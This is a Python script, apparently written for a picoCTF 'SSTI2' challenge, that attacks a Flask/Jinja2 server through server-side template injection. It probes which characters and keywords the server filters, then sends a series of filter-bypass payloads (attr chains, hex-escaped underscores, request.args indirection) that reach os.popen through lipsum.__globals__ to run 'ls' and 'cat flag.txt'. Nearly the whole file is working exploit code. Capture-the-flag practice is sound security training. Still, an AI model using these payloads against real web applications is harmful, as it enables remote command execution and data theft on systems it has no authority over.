#!/usr/bin/env python3
import urllib.request
import urllib.parse
import re

print("=" * 60)
print("ANALIZANDO FILTROS EN SSTI2")
print("=" * 60)

url = "http://shape-facility.picoctf.net:49832/"

def send_payload(payload):
    """Envía un payload al servidor"""
    try:
        data = urllib.parse.urlencode({
            'announcement': payload
        }).encode()
        
        req = urllib.request.Request(url, data=data)
        response = urllib.request.urlopen(req)
        return response.read().decode('utf-8')
    except Exception as e:
        return f"Error: {e}"

print(f"\n[1] Probando caracteres individuales...")

# Caracteres problemáticos típicos
test_chars = {
    '.': 'punto',
    '_': 'guión bajo', 
    '__': 'doble guión bajo',
    '{{': 'llaves dobles apertura',
    '}}': 'llaves dobles cierre',
    '{%': 'llave porcentaje',
    '%}': 'porcentaje llave',
    '[]': 'corchetes',
    '()': 'paréntesis',
    "'": 'comilla simple',
    '"': 'comilla doble',
    '|': 'pipe',
    '\\': 'backslash',
    '/': 'slash',
    '<': 'menor que',
    '>': 'mayor que',
    '&': 'ampersand',
    ';': 'punto y coma',
    '$': 'dólar',
    '`': 'backtick',
    'class': 'palabra class',
    'import': 'palabra import',
    'os': 'palabra os',
    'system': 'palabra system',
    'popen': 'palabra popen',
    'eval': 'palabra eval',
    'exec': 'palabra exec',
    'globals': 'palabra globals',
    'locals': 'palabra locals',
    'builtins': 'palabra builtins',
}

blocked = []
allowed = []

for char, name in test_chars.items():
    result = send_payload(char)
    
    # Ver si el carácter aparece en la respuesta
    if char in result and "error" not in result.lower():
        allowed.append(f"{name} ({char})")
    else:
        blocked.append(f"{name} ({char})")

print("\n[2] Caracteres/palabras BLOQUEADOS:")
for item in blocked[:10]:  # Mostrar solo los primeros 10
    print(f"  ✗ {item}")

print("\n[3] Caracteres/palabras PERMITIDOS:")
for item in allowed[:10]:  # Mostrar solo los primeros 10
    print(f"  ✓ {item}")

print("\n[4] Probando payloads sin caracteres bloqueados...")

# Payloads alternativos que evitan caracteres comunes
alternative_payloads = [
    # Usando solo corchetes y request
    "{{request}}",
    
    # Usando attr para evitar puntos
    "{{()|attr(request.args.c)|attr(request.args.b)}}&c=__class__&b=__base__",
    
    # Usando format
    "{{'{0}'.format(config)}}",
    
    # Usando concatenación
    "{{''['__cla'+'ss__']}}",
    
    # Hexadecimal
    "{{'\x5f\x5fclass\x5f\x5f'}}",
    
    # Unicode
    "{{config}}",
    
    # Sin guiones bajos - usando request.args
    "{{lipsum[request.args.g][request.args.o].popen(request.args.c).read()}}&g=__globals__&o=os&c=ls",
    
    # Usando dict
    "{{dict().__class__.__base__.__subclasses__()}}",
    
    # Usando list comprehension
    "{{[x for x in ().__class__.__base__.__subclasses__()]}}",
]

for payload in alternative_payloads:
    print(f"\n  Probando: {payload[:60]}...")
    result = send_payload(payload)
    
    # Buscar indicios de éxito
    if "picoCTF{" in result:
        flag_match = re.search(r'picoCTF\{[^}]+\}', result)
        if flag_match:
            print(f"    ✓ FLAG ENCONTRADA: {flag_match.group()}")
            break
    elif "<" in result and ">" in result and "object" in result:
        print(f"    ⚠ Objeto Python devuelto - posible SSTI")
    elif "config" in result.lower() or "debug" in result.lower():
        print(f"    ⚠ Información de configuración expuesta")
    elif len(result) > 1000:
        print(f"    ⚠ Respuesta larga ({len(result)} chars) - revisar manualmente")
        # Guardar para análisis
        with open('/workspace/ssti_long_response.html', 'w') as f:
            f.write(result)

print("\n[5] Intentando payloads específicos para bypass...")

# El reto dice que remueve caracteres problemáticos
# Intentemos sin puntos ni guiones bajos
bypass_attempts = [
    # Usando request.args para todo
    "{{lipsum[request['args']['g']][request['args']['o']]['popen'](request['args']['c'])['read']()}}&g=__globals__&o=os&c=cat flag.txt",
    
    # Usando getitem
    "{{lipsum.__getitem__('__globals__').__getitem__('os').popen('ls').read()}}",
    
    # Usando attr con strings
    "{{lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('ls')|attr('read')()}}",
    
    # Codificación alternativa
    "{{lipsum['\x5f\x5fglobals\x5f\x5f']['os'].popen('cat flag.txt').read()}}",
    
    # Sin espacios
    "{{lipsum.__globals__.os.popen('cat'+'flag.txt').read()}}",
]

for payload in bypass_attempts:
    print(f"\n  Bypass: {payload[:70]}...")
    result = send_payload(payload)
    
    if "picoCTF{" in result:
        flag_match = re.search(r'picoCTF\{[^}]+\}', result)
        if flag_match:
            print(f"\n" + "=" * 60)
            print(f"FLAG ENCONTRADA: {flag_match.group()}")
            print("=" * 60)
            break

print("\n" + "=" * 60)